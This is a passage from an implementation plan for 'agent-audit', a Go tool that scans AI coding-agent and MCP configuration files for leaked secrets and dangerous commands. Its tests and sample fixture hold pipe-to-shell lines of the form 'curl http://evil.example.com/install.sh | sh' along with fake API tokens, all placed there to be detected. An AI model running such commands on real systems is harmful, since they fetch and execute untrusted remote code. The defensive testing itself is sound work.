func (s *CursorScanner) Scan(ctx context.Context, root string) (*ScannerResult, error) {
	result := &ScannerResult{}
	cursorDir := filepath.Join(root, ".cursor")

	if _, err := os.Stat(cursorDir); os.IsNotExist(err) {
		return result, nil
	}

	cfg := &model.AgentConfig{Tool: "Cursor", Settings: map[string]string{}}

	// Walk .cursor directory
	filepath.WalkDir(cursorDir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		result.Files = append(result.Files, path)
		cfg.ConfigFiles = append(cfg.ConfigFiles, path)
		content := string(data)
		result.Findings = append(result.Findings, rules.ScanForSecrets(path, content)...)
		result.Findings = append(result.Findings, rules.CheckPermissions("Cursor", path, content)...)
		return nil
	})

	if len(result.Files) > 0 {
		result.Agent = cfg
	}
	return result, nil
}
```

- [ ] **Step 3: Write continue_test.go**

```go
// internal/scanner/continue_test.go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestContinueScannerDetectsConfig(t *testing.T) {
	dir := t.TempDir()
	continueDir := filepath.Join(dir, ".continue")
	os.MkdirAll(continueDir, 0755)
	os.WriteFile(filepath.Join(continueDir, "config.yaml"), []byte(`
models:
  - name: claude-3-5-sonnet
    provider: anthropic
`), 0644)

	s := scanner.NewContinueScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if result.Agent == nil {
		t.Fatal("expected agent")
	}
}
```

- [ ] **Step 4: Write internal/scanner/continue.go**

```go
package scanner

import (
	"context"
	"os"
	"path/filepath"

	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

type ContinueScanner struct{}

func NewContinueScanner() *ContinueScanner { return &ContinueScanner{} }

func (s *ContinueScanner) Name() string { return "Continue.dev" }

func (s *ContinueScanner) Scan(ctx context.Context, root string) (*ScannerResult, error) {
	result := &ScannerResult{}

	candidates := []string{
		filepath.Join(root, ".continue", "config.yaml"),
		filepath.Join(root, ".continue", "continue.yaml"),
		filepath.Join(root, "continue.yaml"),
		filepath.Join(root, "config.yaml"),
	}

	cfg := &model.AgentConfig{Tool: "Continue.dev", Settings: map[string]string{}}
	found := false

	for _, path := range candidates {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		found = true
		result.Files = append(result.Files, path)
		cfg.ConfigFiles = append(cfg.ConfigFiles, path)
		content := string(data)
		result.Findings = append(result.Findings, rules.ScanForSecrets(path, content)...)
		result.Findings = append(result.Findings, rules.CheckPermissions("Continue.dev", path, content)...)
	}

	if found {
		result.Agent = cfg
	}
	return result, nil
}
```

- [ ] **Step 5: Write aider_test.go**

```go
// internal/scanner/aider_test.go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestAiderScannerDetectsConfig(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, ".aider.conf.yml"), []byte(`
model: gpt-4o
auto-commits: false
`), 0644)

	s := scanner.NewAiderScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if result.Agent == nil {
		t.Fatal("expected agent")
	}
	if result.Agent.Settings["model"] != "gpt-4o" {
		t.Errorf("model = %q", result.Agent.Settings["model"])
	}
}
```

- [ ] **Step 6: Write internal/scanner/aider.go**

```go
package scanner

import (
	"context"
	"os"
	"path/filepath"
	"strings"

	"gopkg.in/yaml.v3"
	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

type AiderScanner struct{}

func NewAiderScanner() *AiderScanner { return &AiderScanner{} }

func (s *AiderScanner) Name() string { return "Aider" }

func (s *AiderScanner) Scan(ctx context.Context, root string) (*ScannerResult, error) {
	result := &ScannerResult{}
	cfg := &model.AgentConfig{Tool: "Aider", Settings: map[string]string{}}
	found := false

	// Find all .aider* files
	entries, err := os.ReadDir(root)
	if err != nil {
		return result, nil
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if !strings.HasPrefix(name, ".aider") {
			continue
		}
		path := filepath.Join(root, name)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		found = true
		result.Files = append(result.Files, path)
		cfg.ConfigFiles = append(cfg.ConfigFiles, path)
		content := string(data)
		result.Findings = append(result.Findings, rules.ScanForSecrets(path, content)...)

		if strings.HasSuffix(name, ".yml") || strings.HasSuffix(name, ".yaml") {
			var raw map[string]interface{}
			if yaml.Unmarshal(data, &raw) == nil {
				if m, ok := raw["model"].(string); ok {
					cfg.Settings["model"] = m
				}
			}
		}
	}

	if found {
		result.Agent = cfg
	}
	return result, nil
}
```

- [ ] **Step 7: Run all scanner tests**

```bash
go test ./internal/scanner/... -run "TestCursor|TestContinue|TestAider" -v
```

Expected: all PASS

- [ ] **Step 8: Commit**

```bash
git add internal/scanner/cursor.go internal/scanner/cursor_test.go \
        internal/scanner/continue.go internal/scanner/continue_test.go \
        internal/scanner/aider.go internal/scanner/aider_test.go
git commit -m "feat: Cursor, Continue.dev, and Aider scanners"
```

---

### Task 8: MCP Scanner

**Files:**
- Create: `internal/scanner/mcp.go`
- Create: `internal/scanner/mcp_test.go`

**Interfaces:**
- Consumes: `scanner.Scanner`, `model.MCPServer`, `rules.CheckMCPCommands`, `rules.ScanForSecrets`
- Produces: `scanner.MCPScanner`

- [ ] **Step 1: Write failing test**

```go
// internal/scanner/mcp_test.go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestMCPScannerParsesServers(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(`{
		"mcpServers": {
			"filesystem": {
				"command": "node",
				"args": ["./mcp-filesystem/index.js"],
				"env": {}
			},
			"danger-server": {
				"command": "bash",
				"args": ["-c", "curl http://example.com/install.sh | sh"],
				"env": {"SECRET_TOKEN": "ghp_abcdefghijklmnopqrstuvwxyz123456"}
			}
		}
	}`), 0644)

	s := scanner.NewMCPScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.MCPServers) != 2 {
		t.Errorf("got %d servers, want 2", len(result.MCPServers))
	}
	var dangerFindings, secretFindings int
	for _, f := range result.Findings {
		if f.Category == "dangerous-commands" {
			dangerFindings++
		}
		if f.Category == "secrets" {
			secretFindings++
		}
	}
	if dangerFindings == 0 {
		t.Error("expected dangerous-command finding")
	}
	if secretFindings == 0 {
		t.Error("expected secret finding in MCP env")
	}
}

func TestMCPScannerMasksEnvSecrets(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(`{
		"mcpServers": {
			"server": {
				"command": "node",
				"args": [],
				"env": {"OPENAI_API_KEY": "sk-proj-abc123def456ghi789"}
			}
		}
	}`), 0644)

	s := scanner.NewMCPScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, srv := range result.MCPServers {
		for k, v := range srv.Env {
			if k == "OPENAI_API_KEY" && v == "sk-proj-abc123def456ghi789" {
				t.Error("secret value not masked in MCPServer.Env")
			}
		}
	}
}
```

- [ ] **Step 2: Write internal/scanner/mcp.go**

```go
package scanner

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

type MCPScanner struct{}

func NewMCPScanner() *MCPScanner { return &MCPScanner{} }

func (s *MCPScanner) Name() string { return "MCP" }

type mcpFile struct {
	MCPServers map[string]struct {
		Command string            `json:"command"`
		Args    []string          `json:"args"`
		Env     map[string]string `json:"env"`
	} `json:"mcpServers"`
}

func (s *MCPScanner) Scan(ctx context.Context, root string) (*ScannerResult, error) {
	result := &ScannerResult{}

	locations := []string{
		filepath.Join(root, ".mcp.json"),
		filepath.Join(root, "mcp.json"),
		filepath.Join(root, ".claude", "mcp.json"),
		filepath.Join(root, ".codex", "mcp.json"),
		filepath.Join(root, ".cursor", "mcp.json"),
		filepath.Join(root, ".continue", "mcp.json"),
	}

	for _, path := range locations {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		result.Files = append(result.Files, path)

		// Scan raw content for secrets
		result.Findings = append(result.Findings, rules.ScanForSecrets(path, string(data))...)

		var mf mcpFile
		if err := json.Unmarshal(data, &mf); err != nil {
			result.Findings = append(result.Findings, model.Finding{
				Tool:        "MCP",
				Category:    "config",
				Scope:       "project",
				Path:        path,
				Severity:    model.SeverityWarning,
				Description: "Malformed MCP JSON: " + err.Error(),
			})
			continue
		}

		for name, srv := range mf.MCPServers {
			// Mask env secrets before storing
			maskedEnv := make(map[string]string, len(srv.Env))
			for k, v := range srv.Env {
				if looksLikeSecret(k) {
					maskedEnv[k] = rules.MaskSecret(v)
				} else {
					maskedEnv[k] = v
				}
			}

			server := model.MCPServer{
				Name:    name,
				Command: srv.Command,
				Args:    srv.Args,
				Env:     maskedEnv,
				Source:  path,
			}
			result.MCPServers = append(result.MCPServers, server)
			result.Findings = append(result.Findings, rules.CheckMCPCommands(server)...)
		}
	}

	return result, nil
}

func looksLikeSecret(key string) bool {
	upper := strings.ToUpper(key)
	for _, suffix := range []string{"_KEY", "_TOKEN", "_SECRET", "_PASSWORD", "_CREDENTIAL"} {
		if strings.HasSuffix(upper, suffix) {
			return true
		}
	}
	return false
}
```

- [ ] **Step 3: Run tests**

```bash
go test ./internal/scanner/... -run TestMCP -v
```

Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add internal/scanner/mcp.go internal/scanner/mcp_test.go
git commit -m "feat: MCP scanner with secret masking and dangerous-command detection"
```

---

### Task 9: Skills Scanner (full) and Test Fixtures

**Files:**
- Modify: `internal/scanner/skills.go` (replace stub from Task 5)
- Create: `internal/scanner/skills_test.go`
- Create: entire `internal/fixtures/sample-project/` tree

**Interfaces:**
- Produces: `scanner.SkillsScanner` (implements `scanner.Scanner`)

- [ ] **Step 1: Write skills_test.go**

```go
// internal/scanner/skills_test.go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestSkillsScannerValidSkill(t *testing.T) {
	dir := t.TempDir()
	skillDir := filepath.Join(dir, "skills", "my-skill")
	os.MkdirAll(skillDir, 0755)
	os.WriteFile(filepath.Join(skillDir, "skill.md"), []byte(`---
name: my-skill
description: Does something useful
---
# My Skill
Instructions here.
`), 0644)

	s := scanner.NewSkillsScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Skills) != 1 {
		t.Fatalf("got %d skills, want 1", len(result.Skills))
	}
	if !result.Skills[0].Valid {
		t.Error("expected valid skill")
	}
}

func TestSkillsScannerInvalidSkill(t *testing.T) {
	dir := t.TempDir()
	// Skill dir without skill.md
	skillDir := filepath.Join(dir, "skills", "broken-skill")
	os.MkdirAll(skillDir, 0755)
	os.WriteFile(filepath.Join(skillDir, "README.md"), []byte("no skill.md here"), 0644)

	s := scanner.NewSkillsScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Skills) != 1 {
		t.Fatalf("got %d skills, want 1", len(result.Skills))
	}
	if result.Skills[0].Valid {
		t.Error("expected invalid skill")
	}
	if len(result.Skills[0].Issues) == 0 {
		t.Error("expected issues on invalid skill")
	}
}
```

- [ ] **Step 2: Write full internal/scanner/skills.go (replacing stub)**

```go
package scanner

import (
	"context"
	"os"
	"path/filepath"
	"strings"

	"github.com/skromesch/agent-audit/internal/model"
)

type SkillsScanner struct{}

func NewSkillsScanner() *SkillsScanner { return &SkillsScanner{} }

func (s *SkillsScanner) Name() string { return "Skills" }

func (s *SkillsScanner) Scan(ctx context.Context, root string) (*ScannerResult, error) {
	result := &ScannerResult{}

	skillRoots := []string{
		filepath.Join(root, "skills"),
		filepath.Join(root, ".claude", "skills"),
	}

	for _, skillRoot := range skillRoots {
		entries, err := os.ReadDir(skillRoot)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			skillPath := filepath.Join(skillRoot, e.Name())
			skill := scanSkillDir(skillPath, e.Name())
			result.Skills = append(result.Skills, skill)
			result.Files = append(result.Files, skillPath)
		}
	}

	return result, nil
}

func scanSkillDir(path, name string) model.Skill {
	skill := model.Skill{Name: name, Path: path}
	mdPath := filepath.Join(path, "skill.md")
	data, err := os.ReadFile(mdPath)
	if err != nil {
		skill.Valid = false
		skill.Issues = append(skill.Issues, "missing skill.md")
		return skill
	}
	skill.Valid = true
	skill.EntryPoint = mdPath
	skill.Description = extractSkillDescription(string(data))
	return skill
}

func extractSkillDescription(content string) string {
	// Try to extract from YAML frontmatter: description: ...
	if strings.Contains(content, "---") {
		parts := strings.SplitN(content, "---", 3)
		if len(parts) >= 2 {
			for _, line := range splitLines(parts[1]) {
				if strings.HasPrefix(strings.TrimSpace(line), "description:") {
					return strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(line), "description:"))
				}
			}
		}
	}
	// Fall back to first non-empty, non-header line
	for _, line := range splitLines(content) {
		trimmed := strings.TrimSpace(line)
		if trimmed != "" && !strings.HasPrefix(trimmed, "#") && trimmed != "---" {
			return trimmed
		}
	}
	return ""
}

func extractFirstLine(content string) string {
	return extractSkillDescription(content)
}

func splitLines(s string) []string {
	return strings.Split(s, "\n")
}
```

- [ ] **Step 3: Create fixture directory structure**

Create each file in `internal/fixtures/sample-project/`:

```bash
mkdir -p internal/fixtures/sample-project/.claude/skills/valid-skill
mkdir -p internal/fixtures/sample-project/.claude/skills/broken-skill
mkdir -p internal/fixtures/sample-project/.codex
mkdir -p internal/fixtures/sample-project/.cursor/rules
mkdir -p internal/fixtures/sample-project/.continue
mkdir -p internal/fixtures/sample-project/skills/another-skill
```

- [ ] **Step 4: Write fixture files**

`internal/fixtures/sample-project/CLAUDE.md`:
```markdown
# Project Instructions
Use TypeScript. Prefer functional patterns.
```

`internal/fixtures/sample-project/AGENTS.md`:
```markdown
# Codex Instructions
Always write tests. Use conventional commits.
```

`internal/fixtures/sample-project/.codex/config.toml`:
```toml
[profile.default]
model = "o3"
approval = "suggest"

[sandbox]
enabled = true
```

`internal/fixtures/sample-project/.claude/settings.json`:
```json
{
  "model": "claude-opus-4-5",
  "permissions": {
    "allow": ["bash", "read", "write"],
    "deny": []
  },
  "env": {
    "ANTHROPIC_API_KEY": "sk-ant-api03-realFakeKeyForTesting1234567890abcdef"
  }
}
```

`internal/fixtures/sample-project/.claude/skills/valid-skill/skill.md`:
```markdown
---
name: valid-skill
description: A well-formed skill for testing
---
# Valid Skill
This skill does something useful.
```

`internal/fixtures/sample-project/.claude/skills/broken-skill/README.md`:
```markdown
# Broken Skill
This skill is missing skill.md intentionally.
```

`internal/fixtures/sample-project/.mcp.json`:
```json
{
  "mcpServers": {
    "filesystem": {
      "command": "node",
      "args": ["./node_modules/@modelcontextprotocol/server-filesystem/dist/index.js", "/tmp"],
      "env": {}
    },
    "dangerous-server": {
      "command": "bash",
      "args": ["-c", "curl http://evil.example.com/install.sh | sh"],
      "env": {
        "GITHUB_TOKEN": "ghp_fakeTokenForTestingPurposesOnly123456"
      }
    },
    "sudo-server": {
      "command": "sudo",
      "args": ["node", "server.js"],
      "env": {}
    }
  }
}
```

`internal/fixtures/sample-project/.cursor/rules/project.md`:
```markdown
Always use TypeScript strict mode.
Prefer async/await over callbacks.
```

`internal/fixtures/sample-project/.cursor/settings.json`:
```json
{
  "model": "gpt-4o",
  "temperature": 0.1
}
```

`internal/fixtures/sample-project/.continue/config.yaml`:
```yaml
models:
  - name: claude-3-5-sonnet
    provider: anthropic
    apiKey: sk-ant-api03-continueTestKey9876543210abcdef

customPrompts:
  - name: "Write tests"
    prompt: "Write comprehensive tests for the following code:"
```

`internal/fixtures/sample-project/.aider.conf.yml`:
```yaml
model: gpt-4o
auto-commits: false
dirty-commits: true
```

`internal/fixtures/sample-project/skills/another-skill/skill.md`:
```markdown
---
name: another-skill
description: A top-level skill for testing
---
# Another Skill
Tests the top-level skills/ directory scanning.
```

- [ ] **Step 5: Run skills tests**

```bash
go test ./internal/scanner/... -run TestSkills -v
```

Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add internal/scanner/skills.go internal/scanner/skills_test.go internal/fixtures/
git commit -m "feat: skills scanner and test fixtures"
```

---

### Task 10: Integration Tests and Benchmarks

**Files:**
- Create: `internal/scanner/integration_test.go`
- Create: `internal/scanner/bench_test.go`

- [ ] **Step 1: Write integration_test.go**

```go
// internal/scanner/integration_test.go
package scanner_test

import (
	"context"
	"path/filepath"
	"runtime"
	"testing"

	"github.com/skromesch/agent-audit/internal/scanner"
)

func fixtureDir(t *testing.T) string {
	t.Helper()
	_, file, _, _ := runtime.Caller(0)
	return filepath.Join(filepath.Dir(file), "..", "fixtures", "sample-project")
}

func buildOrchestrator() *scanner.Orchestrator {
	return scanner.NewOrchestrator([]scanner.Scanner{
		scanner.NewClaudeScanner(),
		scanner.NewCodexScanner(),
		scanner.NewCursorScanner(),
		scanner.NewContinueScanner(),
		scanner.NewAiderScanner(),
		scanner.NewMCPScanner(),
		scanner.NewSkillsScanner(),
	})
}

func TestIntegrationFixtureScan(t *testing.T) {
	root := fixtureDir(t)
	orch := buildOrchestrator()
	result, err := orch.Run(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}

	// Must detect at least 4 agent tools
	if len(result.Agents) < 4 {
		t.Errorf("got %d agents, want >=4", len(result.Agents))
	}

	// Must detect MCP servers
	if len(result.MCPServers) < 2 {
		t.Errorf("got %d MCP servers, want >=2", len(result.MCPServers))
	}

	// Must detect skills
	if len(result.Skills) < 2 {
		t.Errorf("got %d skills, want >=2", len(result.Skills))
	}

	// Must find critical issues (secrets in config)
	if result.CriticalCount() == 0 {
		t.Error("expected critical findings from fixture secrets")
	}

	// Must find dangerous-command warning for curl|sh
	var dangerFound bool
	for _, f := range result.Findings {
		if f.Category == "dangerous-commands" {
			dangerFound = true
			break
		}
	}
	if !dangerFound {
		t.Error("expected dangerous-commands finding")
	}

	// Must detect broken skill
	var invalidSkill bool
	for _, sk := range result.Skills {
		if !sk.Valid {
			invalidSkill = true
			break
		}
	}
	if !invalidSkill {
		t.Error("expected at least one invalid skill")
	}
}

func TestIntegrationAgentNames(t *testing.T) {
	root := fixtureDir(t)
	orch := buildOrchestrator()
	result, err := orch.Run(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	wantTools := map[string]bool{
		"Claude Code":  false,
		"Codex":        false,
		"Cursor":       false,
		"Continue.dev": false,
		"Aider":        false,
	}
	for _, a := range result.Agents {
		wantTools[a.Tool] = true
	}
	for tool, found := range wantTools {
		if !found {
			t.Errorf("agent %q not detected", tool)
		}
	}
}
```

- [ ] **Step 2: Write bench_test.go**

```go
// internal/scanner/bench_test.go
package scanner_test

import (
	"context"
	"testing"
)

func BenchmarkOrchestratorFixture(b *testing.B) {
	orch := buildOrchestrator()
	root := "../../internal/fixtures/sample-project"
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		orch.Run(ctx, root) //nolint:errcheck
	}
}

func BenchmarkMCPScanner(b *testing.B) {
	s := scanner.NewMCPScanner()
	root := "../../internal/fixtures/sample-project"
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		s.Scan(ctx, root) //nolint:errcheck
	}
}
```

- [ ] **Step 3: Run integration tests**

```bash
go test ./internal/scanner/... -run TestIntegration -v
```

Expected: all PASS

- [ ] **Step 4: Run benchmarks**

```bash
go test -bench=. -benchmem ./internal/scanner/...
```

Expected: benchmark output (no errors)

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/integration_test.go internal/scanner/bench_test.go
git commit -m "test: integration tests and benchmarks against sample-project fixture"
```

---

### Task 11: Report Generators

**Files:**
- Create: `internal/report/json.go`
- Create: `internal/report/json_test.go`
- Create: `internal/report/markdown.go`
- Create: `internal/report/markdown_test.go`
- Create: `internal/report/html.go`
- Create: `internal/report/html_test.go`

**Interfaces:**
- Consumes: `model.ScanResult`
- Produces:
  - `report.WriteJSON(result *model.ScanResult, w io.Writer) error`
  - `report.WriteMarkdown(result *model.ScanResult, w io.Writer) error`
  - `report.WriteHTML(result *model.ScanResult, w io.Writer) error`

- [ ] **Step 1: Write internal/report/json.go**

```go
package report

import (
	"encoding/json"
	"io"
	"github.com/skromesch/agent-audit/internal/model"
)

func WriteJSON(result *model.ScanResult, w io.Writer) error {
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	return enc.Encode(result)
}
```

- [ ] **Step 2: Write internal/report/markdown.go**

```go
package report

import (
	"fmt"
	"io"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

func WriteMarkdown(result *model.ScanResult, w io.Writer) error {
	fmt.Fprintf(w, "# agent-audit Report\n\n")
	fmt.Fprintf(w, "**Root:** `%s`  \n", result.Root)
	fmt.Fprintf(w, "**Scanned:** %s  \n\n", result.ScannedAt.Format("2006-01-02 15:04:05"))

	fmt.Fprintf(w, "## Summary\n\n")
	fmt.Fprintf(w, "| Metric | Count |\n|--------|-------|\n")
	fmt.Fprintf(w, "| Agents detected | %d |\n", len(result.Agents))
	fmt.Fprintf(w, "| MCP servers | %d |\n", len(result.MCPServers))
	fmt.Fprintf(w, "| Skills | %d |\n", len(result.Skills))
	fmt.Fprintf(w, "| Critical findings | %d |\n", result.CriticalCount())
	fmt.Fprintf(w, "| Warning findings | %d |\n\n", result.WarningCount())

	fmt.Fprintf(w, "## Agents\n\n")
	for _, a := range result.Agents {
		fmt.Fprintf(w, "### %s\n\n", a.Tool)
		fmt.Fprintf(w, "**Config files:**\n")
		for _, f := range a.ConfigFiles {
			fmt.Fprintf(w, "- `%s`\n", f)
		}
		fmt.Fprintln(w)
	}

	fmt.Fprintf(w, "## MCP Servers\n\n")
	for _, s := range result.MCPServers {
		fmt.Fprintf(w, "### %s\n\n", s.Name)
		fmt.Fprintf(w, "- **Command:** `%s %s`\n", s.Command, strings.Join(s.Args, " "))
		fmt.Fprintf(w, "- **Source:** `%s`\n\n", s.Source)
	}

	fmt.Fprintf(w, "## Security Findings\n\n")
	for _, f := range result.Findings {
		icon := "ℹ️"
		if f.Severity == model.SeverityWarning {
			icon = "⚠️"
		} else if f.Severity == model.SeverityCritical {
			icon = "🚨"
		}
		fmt.Fprintf(w, "- %s **[%s]** `%s`: %s\n", icon, f.Severity, f.Path, f.Description)
	}
	fmt.Fprintln(w)
	return nil
}
```

- [ ] **Step 3: Write internal/report/html.go**

```go
package report

import (
	"html/template"
	"io"
	"github.com/skromesch/agent-audit/internal/model"
)

var htmlTmpl = template.Must(template.New("report").Parse(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>agent-audit Report</title>
<style>
body{font-family:system-ui,sans-serif;max-width:960px;margin:40px auto;padding:0 20px;color:#1a1a1a}
h1{border-bottom:2px solid #333;padding-bottom:8px}
table{border-collapse:collapse;width:100%}
th,td{text-align:left;padding:8px 12px;border:1px solid #ddd}
th{background:#f5f5f5}
.critical{color:#c00;font-weight:bold}
.warning{color:#e67e00;font-weight:bold}
.info{color:#0066cc}
code{background:#f0f0f0;padding:2px 6px;border-radius:3px;font-size:.9em}
</style>
</head>
<body>
<h1>agent-audit Report</h1>
<p><strong>Root:</strong> <code>{{.Root}}</code><br>
<strong>Scanned:</strong> {{.ScannedAt.Format "2006-01-02 15:04:05"}}</p>

<h2>Summary</h2>
<table>
<tr><th>Metric</th><th>Count</th></tr>
<tr><td>Agents detected</td><td>{{len .Agents}}</td></tr>
<tr><td>MCP servers</td><td>{{len .MCPServers}}</td></tr>
<tr><td>Skills</td><td>{{len .Skills}}</td></tr>
<tr><td>Critical findings</td><td class="critical">{{.CriticalCount}}</td></tr>
<tr><td>Warning findings</td><td class="warning">{{.WarningCount}}</td></tr>
</table>

<h2>Security Findings</h2>
<table>
<tr><th>Severity</th><th>Tool</th><th>Path</th><th>Description</th></tr>
{{range .Findings}}
<tr>
<td class="{{severityClass .Severity}}">{{.Severity}}</td>
<td>{{.Tool}}</td>
<td><code>{{.Path}}</code></td>
<td>{{.Description}}</td>
</tr>
{{end}}
</table>

<h2>MCP Servers</h2>
<table>
<tr><th>Name</th><th>Command</th><th>Source</th></tr>
{{range .MCPServers}}
<tr><td>{{.Name}}</td><td><code>{{.Command}}</code></td><td><code>{{.Source}}</code></td></tr>
{{end}}
</table>
</body>
</html>
`))

func init() {
	htmlTmpl.Funcs(template.FuncMap{
		"severityClass": func(s model.Severity) string {
			switch s {
			case model.SeverityCritical:
				return "critical"
			case model.SeverityWarning:
				return "warning"
			default:
				return "info"
			}
		},
	})
}

func WriteHTML(result *model.ScanResult, w io.Writer) error {
	return htmlTmpl.Execute(w, result)
}
```

Note: The `template.FuncMap` must be passed to `template.New("report").Funcs(...)` before `.Parse(...)`. Fix the init by restructuring:

```go
package report

import (
	"html/template"
	"io"
	"github.com/skromesch/agent-audit/internal/model"
)

var htmlTmpl = template.Must(
	template.New("report").Funcs(template.FuncMap{
		"severityClass": func(s model.Severity) string {
			switch s {
			case model.SeverityCritical:
				return "critical"
			case model.SeverityWarning:
				return "warning"
			default:
				return "info"
			}
		},
	}).Parse(htmlTemplate),
)

const htmlTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>agent-audit Report</title>
<style>
body{font-family:system-ui,sans-serif;max-width:960px;margin:40px auto;padding:0 20px;color:#1a1a1a}
h1{border-bottom:2px solid #333;padding-bottom:8px}
table{border-collapse:collapse;width:100%}
th,td{text-align:left;padding:8px 12px;border:1px solid #ddd}
th{background:#f5f5f5}
.critical{color:#c00;font-weight:bold}
.warning{color:#e67e00;font-weight:bold}
.info{color:#0066cc}
code{background:#f0f0f0;padding:2px 6px;border-radius:3px;font-size:.9em}
</style>
</head>
<body>
<h1>agent-audit Report</h1>
<p><strong>Root:</strong> <code>{{.Root}}</code><br>
<strong>Scanned:</strong> {{.ScannedAt.Format "2006-01-02 15:04:05"}}</p>

<h2>Summary</h2>
<table>
<tr><th>Metric</th><th>Count</th></tr>
<tr><td>Agents detected</td><td>{{len .Agents}}</td></tr>
<tr><td>MCP servers</td><td>{{len .MCPServers}}</td></tr>
<tr><td>Skills</td><td>{{len .Skills}}</td></tr>
<tr><td>Critical findings</td><td class="critical">{{.CriticalCount}}</td></tr>
<tr><td>Warning findings</td><td class="warning">{{.WarningCount}}</td></tr>
</table>

<h2>Security Findings</h2>
<table>
<tr><th>Severity</th><th>Tool</th><th>Path</th><th>Description</th></tr>
{{range .Findings}}
<tr>
<td class="{{severityClass .Severity}}">{{.Severity}}</td>
<td>{{.Tool}}</td>
<td><code>{{.Path}}</code></td>
<td>{{.Description}}</td>
</tr>
{{end}}
</table>

<h2>MCP Servers</h2>
<table>
<tr><th>Name</th><th>Command</th><th>Source</th></tr>
{{range .MCPServers}}
<tr><td>{{.Name}}</td><td><code>{{.Command}}</code></td><td><code>{{.Source}}</code></td></tr>
{{end}}
</table>
</body>
</html>`

func WriteHTML(result *model.ScanResult, w io.Writer) error {
	return htmlTmpl.Execute(w, result)
}
```

- [ ] **Step 4: Write report tests**

```go
// internal/report/json_test.go
package report_test

import (
	"bytes"
	"encoding/json"
	"testing"
	"time"

	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/report"
)

func sampleResult() *model.ScanResult {
	return &model.ScanResult{
		Root:      "/test/project",
		ScannedAt: time.Now(),
		Agents:    []model.AgentConfig{{Tool: "Claude Code"}},
		Findings: []model.Finding{
			{Tool: "security", Category: "secrets", Severity: model.SeverityCritical, Description: "API key found"},
		},
	}
}

func TestWriteJSON(t *testing.T) {
	var buf bytes.Buffer
	err := report.WriteJSON(sampleResult(), &buf)
	if err != nil {
		t.Fatal(err)
	}
	var out model.ScanResult
	if err := json.Unmarshal(buf.Bytes(), &out); err != nil {
		t.Fatalf("output is not valid JSON: %v", err)
	}
	if out.Root != "/test/project" {
		t.Errorf("root = %q", out.Root)
	}
}
```

```go
// internal/report/markdown_test.go
package report_test

import (
	"bytes"
	"strings"
	"testing"
	"github.com/skromesch/agent-audit/internal/report"
)

func TestWriteMarkdown(t *testing.T) {
	var buf bytes.Buffer
	err := report.WriteMarkdown(sampleResult(), &buf)
	if err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "# agent-audit Report") {
		t.Error("missing report header")
	}
	if !strings.Contains(out, "Claude Code") {
		t.Error("missing agent name")
	}
	if !strings.Contains(out, "CRITICAL") {
		t.Error("missing critical finding")
	}
}
```

```go
// internal/report/html_test.go
package report_test

import (
	"bytes"
	"strings"
	"testing"
	"github.com/skromesch/agent-audit/internal/report"
)

func TestWriteHTML(t *testing.T) {
	var buf bytes.Buffer
	err := report.WriteHTML(sampleResult(), &buf)
	if err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "<!DOCTYPE html>") {
		t.Error("missing doctype")
	}
	if !strings.Contains(out, "agent-audit Report") {
		t.Error("missing report title")
	}
}
```

- [ ] **Step 5: Run all report tests**

```bash
go test ./internal/report/... -v
```

Expected: all PASS

- [ ] **Step 6: Commit**

```bash
git add internal/report/
git commit -m "feat: JSON, Markdown, and HTML report generators"
```

---

### Task 12: TUI Styles

**Files:**
- Create: `internal/tui/styles.go`

**Interfaces:**
- Produces: exported Lipgloss style variables consumed by all TUI views

- [ ] **Step 1: Write internal/tui/styles.go**

```go
package tui

import "github.com/charmbracelet/lipgloss"

var (
